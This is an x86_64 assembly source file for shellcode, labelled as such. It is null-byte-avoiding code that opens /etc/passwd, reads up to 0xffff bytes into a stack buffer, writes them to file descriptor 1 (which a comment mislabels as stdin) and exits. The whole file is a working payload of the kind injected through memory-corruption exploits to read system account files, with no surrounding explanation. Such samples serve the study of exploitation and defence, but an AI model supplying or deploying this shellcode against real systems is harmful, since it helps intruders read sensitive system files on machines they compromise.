; open read write shellcode /etc/passwd x86_64
[SECTION .text]

global _start

_start:

    ; open //etc/passwd

    xor rax, rax        ; clear RAX
    push rax            ; push NULL byte   
    mov al, 0x2        ; open syscall
    mov r9, "//passwd"
    mov r8, "/etc////"
    push r9
    push r8
    mov rdi, rsp        ; RBX ptr to //etc/passwd
    xor rsi, rsi        ; int flags 
    xor rdx, rdx        ; int mode
    syscall             ; syscall open

    ; read //etc/passwd

    xchg rdi, rax       ; get file descriptor in RDI
    xor rax, rax        ; clear RAX
    mov al, 0x0         ; read syscall
    lea rsi, [rsp]      ; buffer
    xor rdx, rdx        ; clear RDX
    add dx, 0xffff      ; size to read
    syscall             ; syscall read

    ; write stdin   

    xchg rax, rdx       ; RDX size read
    xor rax, rax        ; clear 
    mov al, 0x1         ; write syscall
    xor rdi, rdi        ; clear RDI
    inc rdi             ; stdin
                        ; RSI = buffer still
    syscall             ; syscall write

    xor rax, rax        ; clear EAX
    mov al, 0x3c        ; exit syscall
    xor rdi, rdi        ; exit 0
    syscall             ; syscall exit
